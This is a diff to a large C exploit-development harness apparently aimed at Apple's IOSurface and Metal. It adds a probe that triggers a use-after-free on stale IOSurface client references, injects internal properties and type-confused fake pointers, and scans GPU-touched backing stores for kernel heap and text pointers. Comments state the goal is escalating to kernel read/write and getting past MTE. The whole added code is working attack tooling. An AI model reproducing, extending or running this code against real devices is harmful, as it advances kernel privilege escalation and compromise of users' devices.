@@ -15541,7 +15541,7 @@ static void r359_probe(void) {
     for (int t = 0; t < 4 && t < created; t++) {
         uint32_t target_id = surf_ids[t * (created / 4)];
         race_ctx_359_t ctx = { .conn = conn, .surf_id = target_id,
-                               .go = 0, .done = 0, .iterations = 1000 };
+                               .go = 0, .done = 0, .iterations = 100000 };
 
         pthread_t th_reg, th_unreg;
         pthread_create(&th_reg, NULL, r359_race_register, &ctx);
@@ -16113,6 +16113,468 @@ r356_cleanup:
     if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
     if (metal_lib) dlclose(metal_lib);
     rlog("\n=== r356 complete ===\n");
+    fflush(stdout);
+}
+
+/* r360: IOSurface backing store address confusion + internal property injection.
+ * r298 CONFIRMED: Userspace UAF gives cross-read/cross-write on IOSurface properties.
+ * r284 CONFIRMED: Kernel-side Lock race triggers MTE fault at +0xD8.
+ *
+ * STRATEGY: Instead of brute-forcing MTE, try to escalate the USERSPACE
+ * property cross-write into kernel R/W by:
+ *   1. Injecting internal IOSurface properties (AllocSize, Offset, PlaneBase)
+ *      via stale client SetValue — if kernel respects them, we can redirect
+ *      the backing store mapping to kernel memory
+ *   2. Type confusion: set numeric properties as CFData via stale client
+ *   3. Check if GPU writes kernel addresses into IOSurface backing store
+ *      (MTE-free readable from userspace)
+ *   4. Test IOSurface backing store overlap with kernel heap zone
+ */
+static void r360_probe(void) {
+    rlog("\n=== r360: IOSurface Property Injection + Backing Store Confusion ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+
+    if (!clLookup || !clRelease || !clSetValue) {
+        rlog("  FATAL: missing IOSurface client APIs\n");
+        return;
+    }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as=64*64*4;
+
+    /* ---- Part 1: Set up UAF + internal property injection ---- */
+    rlog("--- Part 1: Internal property injection via stale client ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t victimID = IOSurfaceGetID(victim);
+
+        IOSurfaceClientRef stale = clLookup(victimID);
+        IOSurfaceClientRef cl1 = clLookup(victimID);
+        IOSurfaceClientRef cl2 = clLookup(victimID);
+
+        CFRelease(victim);
+        clRelease(cl1);
+        clRelease(cl2);
+        clRelease(stale);
+
+        CFMutableDictionaryRef np = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(np,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(np,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef newsurf = IOSurfaceCreate(np);
+        CFRelease(np);
+        uint32_t newID = newsurf ? IOSurfaceGetID(newsurf) : 0;
+        rlog("  victimID=%u newID=%u id_reused=%d\n", victimID, newID, newID==victimID);
+
+        /* Record pre-injection values */
+        size_t pre_alloc = IOSurfaceGetAllocSize(newsurf);
+        size_t pre_bpr = IOSurfaceGetBytesPerRow(newsurf);
+        size_t pre_bpe = IOSurfaceGetBytesPerElement(newsurf);
+        size_t pre_w = IOSurfaceGetWidth(newsurf);
+        size_t pre_h = IOSurfaceGetHeight(newsurf);
+        IOSurfaceLock(newsurf, 0, NULL);
+        void *pre_base = IOSurfaceGetBaseAddress(newsurf);
+        IOSurfaceUnlock(newsurf, 0, NULL);
+        rlog("  pre: alloc=%zu bpr=%zu bpe=%zu w=%zu h=%zu base=%p\n",
+            pre_alloc, pre_bpr, pre_bpe, pre_w, pre_h, pre_base);
+
+        /* Test internal property keys via stale client */
+        const char *internal_keys[] = {
+            "IOSurfaceAllocSize", "IOSurfaceBytesPerRow",
+            "IOSurfaceBytesPerElement", "IOSurfaceOffset",
+            "IOSurfacePlaneBase", "IOSurfacePlaneOffset",
+            "IOSurfacePlaneSize", "IOSurfacePurgeableState",
+            "IOSurfaceCacheMode", "IOSurfaceIsGlobal",
+            "IOSurfaceAddress", "IOSurfacePhysicalAddress",
+            "IOSurfaceMemoryRegion", "IOSurfaceMapCacheMode",
+            NULL
+        };
+        for (int i = 0; internal_keys[i]; i++) {
+            CFStringRef key = CFStringCreateWithCString(NULL, internal_keys[i],
+                kCFStringEncodingUTF8);
+            /* Read current value */
+            CFTypeRef cur = clCopyValue ? clCopyValue(stale, key) : NULL;
+            rlog("  read '%s': %s", internal_keys[i], cur ? "exists" : "NULL");
+            if (cur) {
+                if (CFGetTypeID(cur) == CFNumberGetTypeID()) {
+                    long long v = 0;
+                    CFNumberGetValue(cur, kCFNumberLongLongType, &v);
+                    rlog(" = %lld (0x%llx)", v, (unsigned long long)v);
+                }
+                CFRelease(cur);
+            }
+
+            /* Try setting to a large value via stale client */
+            long long big = 0x100000;
+            CFNumberRef bignum = CFNumberCreate(NULL, kCFNumberLongLongType, &big);
+            clSetValue(stale, key, bignum);
+            CFRelease(bignum);
+
+            /* Read back via NORMAL surface */
+            CFTypeRef after = IOSurfaceCopyValue(newsurf, key);
+            if (after) {
+                if (CFGetTypeID(after) == CFNumberGetTypeID()) {
+                    long long v = 0;
+                    CFNumberGetValue(after, kCFNumberLongLongType, &v);
+                    rlog(" -> after_set=%lld", v);
+                }
+                CFRelease(after);
+            }
+            rlog("\n");
+            CFRelease(key);
+        }
+
+        /* Check if any properties actually changed */
+        size_t post_alloc = IOSurfaceGetAllocSize(newsurf);
+        size_t post_bpr = IOSurfaceGetBytesPerRow(newsurf);
+        IOSurfaceLock(newsurf, 0, NULL);
+        void *post_base = IOSurfaceGetBaseAddress(newsurf);
+        IOSurfaceUnlock(newsurf, 0, NULL);
+        rlog("  post: alloc=%zu bpr=%zu base=%p\n", post_alloc, post_bpr, post_base);
+        if (post_alloc != pre_alloc) rlog("  *** ALLOC SIZE CHANGED! ***\n");
+        if (post_bpr != pre_bpr) rlog("  *** BPR CHANGED! ***\n");
+        if (post_base != pre_base) rlog("  *** BASE ADDRESS CHANGED! ***\n");
+        fflush(stdout);
+
+        if (newsurf) CFRelease(newsurf);
+    }
+
+    /* ---- Part 2: Type confusion — set numeric fields as CFData ---- */
+    rlog("\n--- Part 2: Type confusion via property type mismatch ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef victim2 = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t vID2 = IOSurfaceGetID(victim2);
+
+        IOSurfaceClientRef stale2 = clLookup(vID2);
+        IOSurfaceClientRef c2a = clLookup(vID2);
+        IOSurfaceClientRef c2b = clLookup(vID2);
+        CFRelease(victim2);
+        clRelease(c2a);
+        clRelease(c2b);
+        clRelease(stale2);
+
+        CFMutableDictionaryRef np2 = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(np2,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(np2,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(np2,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(np2,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(np2,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(np2,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef ns2 = IOSurfaceCreate(np2);
+        CFRelease(np2);
+        rlog("  newID=%u\n", ns2 ? IOSurfaceGetID(ns2) : 0);
+
+        /* Set "IOSurfaceWidth" as CFData (8 bytes = fake pointer) */
+        uint64_t fake_ptr = 0xDEADCAFE00000000ULL;
+        CFDataRef fake_data = CFDataCreate(NULL, (const uint8_t*)&fake_ptr, 8);
+        clSetValue(stale2, CFSTR("IOSurfaceWidth"), fake_data);
+        CFRelease(fake_data);
+
+        /* Read back via stale and normal */
+        CFTypeRef rv_stale = clCopyValue ? clCopyValue(stale2, CFSTR("IOSurfaceWidth")) : NULL;
+        CFTypeRef rv_norm = IOSurfaceCopyValue(ns2, CFSTR("IOSurfaceWidth"));
+        rlog("  stale read 'IOSurfaceWidth': type=%s",
+            rv_stale ? (CFGetTypeID(rv_stale)==CFDataGetTypeID()?"CFData":
+                        CFGetTypeID(rv_stale)==CFNumberGetTypeID()?"CFNumber":"other") : "NULL");
+        if (rv_stale && CFGetTypeID(rv_stale) == CFDataGetTypeID()) {
+            CFIndex len = CFDataGetLength(rv_stale);
+            const uint8_t *bytes = CFDataGetBytePtr(rv_stale);
+            rlog(" len=%ld", (long)len);
+            if (len >= 8) {
+                uint64_t v;
+                memcpy(&v, bytes, 8);
+                rlog(" val=0x%016llx", (unsigned long long)v);
+            }
+        }
+        rlog("\n");
+        rlog("  normal read 'IOSurfaceWidth': type=%s",
+            rv_norm ? (CFGetTypeID(rv_norm)==CFDataGetTypeID()?"CFData":
+                       CFGetTypeID(rv_norm)==CFNumberGetTypeID()?"CFNumber":"other") : "NULL");
+        rlog("\n");
+
+        /* Check if framework-level accessor changed */
+        size_t new_w = IOSurfaceGetWidth(ns2);
+        rlog("  IOSurfaceGetWidth after type confusion: %zu (was %d)\n", new_w, w);
+        if (new_w != (size_t)w) rlog("  *** WIDTH CHANGED BY TYPE CONFUSION! ***\n");
+
+        /* Set "IOSurfaceAllocSize" as large CFNumber via stale */
+        long long huge = 0x40000000LL;
+        CFNumberRef hugenum = CFNumberCreate(NULL, kCFNumberLongLongType, &huge);
+        clSetValue(stale2, CFSTR("IOSurfaceAllocSize"), hugenum);
+        CFRelease(hugenum);
+        size_t new_alloc = IOSurfaceGetAllocSize(ns2);
+        rlog("  IOSurfaceGetAllocSize after big set: %zu (was %d)\n", new_alloc, as);
+        if (new_alloc != (size_t)as) rlog("  *** ALLOC SIZE CHANGED! ***\n");
+
+        if (rv_stale) CFRelease(rv_stale);
+        if (rv_norm) CFRelease(rv_norm);
+        if (ns2) CFRelease(ns2);
+    }
+
+    /* ---- Part 3: GPU kernel pointer deposit into backing store ---- */
+    rlog("\n--- Part 3: GPU kernel pointer deposit into backing store ---\n");
+    fflush(stdout);
+    {
+        /* Create surface, map it, zero it, do GPU work, scan for kptrs */
+        int big_w = 256, big_h = 256, big_bpe = 4;
+        int big_bpr = big_w * big_bpe, big_as = big_w * big_h * big_bpe;
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&big_w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&big_h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&big_bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&big_bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&big_as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef gpuSurf = IOSurfaceCreate(p);
+        CFRelease(p);
+        if (!gpuSurf) { rlog("  FAILED to create GPU surface\n"); goto part4; }
+
+        IOSurfaceLock(gpuSurf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(gpuSurf);
+        memset(base, 0, big_as);
+        IOSurfaceUnlock(gpuSurf, 0, NULL);
+
+        /* Trigger Metal GPU work referencing this surface */
+        void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_NOW);
+        void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+        void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+        void *(*getClass)(const char*) = dlsym(RTLD_DEFAULT, "objc_getClass");
+        typedef void *(*mtlCreate_t)(void);
+        mtlCreate_t mtlCreate = (mtlCreate_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+
+        if (!mtlCreate || !msgSend || !regSel) {
+            rlog("  Metal/runtime not available\n");
+            CFRelease(gpuSurf);
+            goto part4;
+        }
+
+        void *device = mtlCreate();
+        if (!device) { rlog("  No Metal device\n"); CFRelease(gpuSurf); goto part4; }
+
+        void *cmdQ = ((void*(*)(void*,void*))msgSend)(device, regSel("newCommandQueue"));
+        if (!cmdQ) { rlog("  No command queue\n"); CFRelease(gpuSurf); goto part4; }
+
+        /* Create texture from IOSurface */
+        void *texDesc = ((void*(*)(void*,void*))msgSend)(
+            getClass("MTLTextureDescriptor"), regSel("texture2DDescriptorWithPixelFormat:width:height:mipmapped:"));
+        /* Use simpler API: newTextureWithDescriptor from device */
+        /* Actually use IOSurface-backed texture */
+        void *desc = ((void*(*)(void*,void*,unsigned long,unsigned long,int))msgSend)(
+            getClass("MTLTextureDescriptor"),
+            regSel("texture2DDescriptorWithPixelFormat:width:height:mipmapped:"),
+            (unsigned long)80 /* MTLPixelFormatBGRA8Unorm */,
+            (unsigned long)big_w, (unsigned long)big_h, 0);
+        if (desc) {
+            ((void(*)(void*,void*,unsigned long))msgSend)(desc,
+                regSel("setUsage:"), (unsigned long)0x05);
+            void *tex = ((void*(*)(void*,void*,void*,unsigned long,unsigned long))msgSend)(
+                device,
+                regSel("newTextureWithDescriptor:iosurface:plane:level:"),
+                desc, (void*)gpuSurf, (unsigned long)0, (unsigned long)0);
+            rlog("  Metal texture from IOSurface: %p\n", tex);
+
+            if (tex) {
+                /* Submit a blit to touch the texture */
+                void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (cmdBuf) {
+                    void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf,
+                        regSel("blitCommandEncoder"));
+                    if (blit) {
+                        ((void(*)(void*,void*,void*))msgSend)(blit,
+                            regSel("synchronizeResource:"), tex);
+                        ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                    }
+                    ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("commit"));
+                    ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("waitUntilCompleted"));
+                    rlog("  GPU blit completed\n");
+                }
+                ((void(*)(void*,void*))msgSend)(tex, regSel("release"));
+            }
+        }
+        ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+        if (metal_lib) dlclose(metal_lib);
+
+        /* Now scan the backing store for kernel pointers */
+        IOSurfaceLock(gpuSurf, kIOSurfaceLockReadOnly, NULL);
+        base = IOSurfaceGetBaseAddress(gpuSurf);
+        uint64_t *qwords = (uint64_t *)base;
+        int n_qw = big_as / 8;
+        int kptr_count = 0;
+        rlog("  Scanning %d qwords in backing store for kernel pointers...\n", n_qw);
+        for (int i = 0; i < n_qw; i++) {
+            uint64_t v = qwords[i];
+            if (v == 0) continue;
+            /* Check kernel heap range (0xFFFFFFFE........) */
+            if ((v >> 32) >= 0xFFFFFFFE && (v >> 32) <= 0xFFFFFFFF) {
+                rlog("  KPTR at backing_store+%d: 0x%016llx [KERNEL HEAP]\n",
+                    i*8, (unsigned long long)v);
+                kptr_count++;
+                if (kptr_count >= 20) { rlog("  (truncated)\n"); break; }
+            }
+            /* Check kernel text range */
+            if ((v >> 36) == 0xFFFFFFF && v > 0xFFFFFFF007004000ULL &&
+                v < 0xFFFFFFF027004000ULL) {
+                rlog("  KPTR at backing_store+%d: 0x%016llx [KERNEL TEXT]\n",
+                    i*8, (unsigned long long)v);
+                kptr_count++;
+                if (kptr_count >= 20) { rlog("  (truncated)\n"); break; }
+            }
+        }
+        IOSurfaceUnlock(gpuSurf, kIOSurfaceLockReadOnly, NULL);
+        rlog("  Total kernel pointers in backing store: %d\n", kptr_count);
+        CFRelease(gpuSurf);
+    }
+
+part4:
+    /* ---- Part 4: Small surface backing store + kernel heap overlap test ---- */
+    rlog("\n--- Part 4: 448-byte surface backing store vs kernel heap ---\n");
+    fflush(stdout);
+    {
+        /* Create surfaces with AllocSize=448 (same as IOSurfaceClientRef) */
+        int small_w = 112, small_h = 1, small_bpe = 4, small_bpr = 448, small_as = 448;
+
+        IOSurfaceRef small_surfs[64];
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&small_w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&small_h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&small_bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&small_bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&small_as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+            small_surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+        }
+
+        int created = 0;
+        for (int i = 0; i < 64; i++) if (small_surfs[i]) created++;
+        rlog("  Created %d surfaces with AllocSize=448\n", created);
+
+        /* Map each and record base addresses */
+        for (int i = 0; i < 64 && i < 10; i++) {
+            if (!small_surfs[i]) continue;
+            IOSurfaceLock(small_surfs[i], 0, NULL);
+            void *b = IOSurfaceGetBaseAddress(small_surfs[i]);
+            size_t actual_alloc = IOSurfaceGetAllocSize(small_surfs[i]);
+            IOSurfaceUnlock(small_surfs[i], 0, NULL);
+            rlog("  [%2d] id=%3u base=%p alloc=%zu\n",
+                i, IOSurfaceGetID(small_surfs[i]), b, actual_alloc);
+        }
+
+        /* Get a client ref, check if its address falls near any backing store */
+        if (created > 0 && clLookup) {
+            uint32_t testID = IOSurfaceGetID(small_surfs[0]);
+            IOSurfaceClientRef testCl = clLookup(testID);
+            uint64_t clAddr = (uint64_t)testCl;
+            rlog("  ClientRef addr: 0x%016llx\n", (unsigned long long)clAddr);
+
+            for (int i = 0; i < 64; i++) {
+                if (!small_surfs[i]) continue;
+                IOSurfaceLock(small_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                void *b = IOSurfaceGetBaseAddress(small_surfs[i]);
+                IOSurfaceUnlock(small_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                uint64_t bAddr = (uint64_t)b;
+                int64_t delta = (int64_t)(clAddr - bAddr);
+                if (delta >= 0 && delta < 4096) {
+                    rlog("  ** CLIENT REF NEAR BACKING STORE [%d]! delta=%lld **\n",
+                        i, (long long)delta);
+                }
+            }
+        }
+
+        for (int i = 0; i < 64; i++) if (small_surfs[i]) CFRelease(small_surfs[i]);
+    }
+
+    rlog("\n=== r360 complete ===\n");
     fflush(stdout);
 }
 
@@ -53314,6 +53776,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 363) {
+            rlog("*** rounds=363: IOSurface Property Injection + Backing Store Confusion ***\n");
+            rlog("  Testing: internal property injection via stale client,\n");
+            rlog("  type confusion, GPU kptr deposit, backing store overlap.\n\n");
+            fflush(stdout);
+            r360_probe();
+            goto done;
+        }
         if (rounds == 362) {
             rlog("*** rounds=362: IOSurface Race + Heap Leak Vtable Read ***\n");
             rlog("  Combining: Metal heap leak + IOSurface sel17/18 race\n");
@@ -55422,7 +55892,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -65264,7 +65734,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
